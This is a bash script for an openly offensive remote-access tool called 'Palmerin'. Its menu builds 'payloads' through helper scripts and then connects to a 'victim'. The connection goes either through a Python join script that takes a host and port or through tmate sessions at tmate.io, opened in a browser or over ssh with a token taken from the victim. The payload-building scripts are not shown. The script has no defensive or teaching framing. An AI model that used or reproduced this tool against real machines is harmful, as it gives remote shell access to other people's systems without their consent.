
#!/bin/bash
trap ctrl_c INT
ctrl_c(){ home;}
home(){
clear
echo -e "\e[35m$(figlet -f smslant Palmerin)\e[0m"
echo "         by 4n.alejo"
echo
echo -e "\e[35m[1]\e[0m created"
echo -e "\e[35m[2]\e[0m connect"
echo -e "\e[35m[0]\e[0m exit"
echo
echo -en "choose option \e[92m?\e[0m "
read opc
if [[ $opc == "1" ]];
then
echo -e "\e[35m[1]\e[0m joinpy"
echo -e "\e[35m[2]\e[0m tmate"
echo -en "choose option \e[92m?\e[0m "
read opc
if [[ $opc == "1" ]];
then
cd joinpy
bash created.sh
cd ..
echo -e "\e[92m< $(pwd) >\e[0m here is your payload !"
echo -en "enter to continue \e[92m!\e[0m "
read
home
elif [[ $opc == "2" ]];
then
cd tmate
bash created.sh 
cd .. 
echo -e "\e[92m< $(pwd) >\e[0m here is your payload !"
echo -en "enter to continue \e[92m!\e[0m "
read
home
else
home
fi
read
elif [[ $opc == "2" ]];
then
echo -e "\e[35m[1]\e[0m joinpy"
echo -e "\e[35m[2]\e[0m tmate"
echo -en "choose option \e[92m?\e[0m "
read opc
if [[ $opc == "1" ]];
then
echo -en "enter host \e[92m?\e[0m "
read host
echo -en "enter port \e[92m?\e[0m "
read port
python joinpy/join.py $host $port
home
elif [[ $opc == "2" ]];
then
echo -en "victim's token \e[92m?\e[0m "
read token
echo -en "choose service \e[92mweb/term\e[0m "
read cs
if [[ $cs == "web" ]];
then
python -m webbrowser -n https://tmate.io/t/$token
echo -en "enter to continue \e[92m!\e[0m "
read
home
elif [[ $cs == "term" ]];
then
ssh $token@nyc1.tmate.io
home
else
home
fi
else
home
fi
elif [[ $opc == "0" ]];
then
exit
else
home
fi
}
home
